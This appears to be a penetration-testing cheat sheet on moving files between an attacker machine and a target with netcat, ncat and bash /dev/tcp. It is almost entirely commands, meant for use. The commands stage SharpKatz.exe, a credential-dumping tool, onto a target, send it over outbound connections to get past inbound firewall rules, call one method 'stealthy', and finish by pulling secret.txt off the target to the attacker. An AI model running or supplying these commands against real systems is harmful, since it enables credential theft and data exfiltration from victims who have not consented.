## 1. Send File from Attacker to Target

### On Target (Listener)

```bash
nc -l -p 8000 > SharpKatz.exe
```

### On Attacker (Sender)

```bash
wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
nc -q 0 192.168.49.128 8000 < SharpKatz.exe
```

**Note:**  
`-q 0` closes the connection after the transfer completes.

---

## 2. Using Ncat for More Stability

### On Target (Receiver)

```bash
ncat -l -p 8000 --recv-only > SharpKatz.exe
```

### On Attacker (Sender)

```bash
ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```

---

## 3. Reverse Connection (Bypass Inbound Firewall Rules)

Outbound connections are usually allowed, making this method more firewall-friendly.

### On Attacker (Listener on Port 443)

```bash
# Netcat
sudo nc -l -p 443 -q 0 < SharpKatz.exe

# Ncat
sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

### On Target (Retrieve File)

```bash
# Netcat
nc 192.168.49.128 443 > SharpKatz.exe

# Ncat
ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
```

---

## 4. Using Bash with /dev/tcp

If neither Netcat nor Ncat is installed, Bash can handle the transfer using the `/dev/tcp` trick.

### On Attacker

```bash
sudo nc -l -p 443 -q 0 < SharpKatz.exe
# OR
sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

### On Target

```bash
cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```

**Note:**  
`cat` reads from the network as if itâ€™s a file, making this a clean and stealthy method.

---

## 5. Reverse Transfers (Target to Attacker)

To pull files from the target, just reverse the roles:

- **Attacker:** Start listener with Netcat or Ncat.
    
- **Target:** Connect back and send the file.
    

Example:

```bash
# On Target
nc 192.168.49.128 443 < secret.txt
```
